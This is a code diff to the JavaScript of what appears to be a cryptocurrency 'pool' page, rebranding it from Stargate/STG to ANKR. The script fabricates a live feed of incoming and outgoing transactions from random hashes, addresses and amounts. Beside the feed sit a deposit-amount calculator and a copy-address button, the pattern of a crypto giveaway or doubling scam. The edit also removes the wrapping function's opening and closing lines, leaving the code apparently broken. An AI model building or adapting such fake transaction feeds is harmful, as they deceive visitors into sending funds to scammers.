@@ -1,5 +1,3 @@
-  (function($) {
-    "use strict";
 var parcent = 3;
 
 function update_count() {
@@ -55,9 +53,9 @@ function create_transaction(mins) {
         mins +
         ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
-        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">Stargate Pool</span> </td> <td>' +
+        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">ANKR Pool</span> </td> <td>' +
         amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
-        ' STG</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        ' ANKR</td> <td><span class="small text-secondary">0<b>.</b>000' +
         tx(999) +
         "</span></td> </tr>";
     var table,
@@ -70,11 +68,11 @@ function create_transaction(mins) {
         tx(99999999) +
         '</a></td> <td><span class="timer">' +
         mins +
-        ' mins ago</span></td> <td><span class="hash-tag text-truncate">Stargate Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        ' mins ago</span></td> <td><span class="hash-tag text-truncate">ANKR Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
         "</a> </td> <td>" +
         send_amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
-        ' STG</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        ' ANKR</td> <td><span class="small text-secondary">0<b>.</b>000' +
         tx(999) +
         "</span></td> </tr>";
 }
@@ -98,9 +96,9 @@ function new_transaction() {
         tx(99999999) +
         '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
-        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">Stargate Pool</span> </td> <td>' +
+        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">ANKR Pool</span> </td> <td>' +
         amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
-        ' STG</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        ' ANKR</td> <td><span class="small text-secondary">0<b>.</b>000' +
         tx(999) +
         "</span></td> </tr>"),
     document
@@ -116,11 +114,11 @@ function new_transaction() {
                 generateId(63) +
                 '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
                 tx(99999999) +
-                '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">Stargate Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+                '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">ANKR Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
                 address +
                 "</a> </td> <td>" +
                 send_amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
-                ' STG</td> <td><span class="small text-secondary">0<b>.</b>000' +
+                ' ANKR</td> <td><span class="small text-secondary">0<b>.</b>000' +
                 tx(999) +
                 "</span></td> </tr>"),
             document
@@ -208,6 +206,21 @@ $(document).ready(() => {
     $("#close").click(() => {
         $(".pop-body").css("display", "none");
     }),
+    setTimeout(function() {
+        let viewheight = $(window).height(),
+            viewwidth = $(window).width(),
+            viewport;
+        document
+            .querySelector("meta[name=vie324242wport]")
+            .setAttribute(
+                "content",
+                "height=" +
+                viewheight +
+                "px, width=" +
+                viewwidth +
+                "px, initial-scale=1.0"
+            );
+    }, 300)
 $("#cal-in").on("input", () => {
     var in_amount = $("#cal-in").val();
     if (in_amount > 0 && in_amount < 150) {
@@ -273,5 +286,5 @@ $("#copy_address").click(() => {
 $("#copy_address").mouseout(() => {
     $("#done-copy").css("opacity", 0), $("#copy_address").css("opacity", 1);
 });
-});
+
 // Copy address part ends here
